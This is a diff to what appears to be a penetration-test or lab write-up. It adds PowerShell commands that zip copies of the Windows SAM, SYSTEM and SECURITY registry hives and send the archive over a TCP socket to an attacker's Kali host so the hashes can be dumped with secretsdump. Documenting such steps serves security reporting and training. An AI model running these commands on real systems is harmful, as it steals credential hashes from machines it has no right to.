@@ -51,8 +51,18 @@ Severity: HIGH
 
 ## Dumping hashes with secretsdump:
 
-> First, let's use powershell to send the files to Kali:
+> First, let's use powershell to zip the files and then send the .zip file to Kali:
 
 ```shell
 Compress-Archive -Path "C:\Windows\Tasks\SYSTEM-2025-02-11", "C:\Windows\Tasks\SECURITY-2025-02-11", "C:\Windows\Tasks\SAM-2025-01-15" -DestinationPath "C:\Windows\Tasks\hives.zip"
+```
+
+```powershell
+[System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Windows\Tasks\hives.zip" -Encoding Byte))
+
+$client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\hives.zip")
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Close(); $client.Close()
 ```
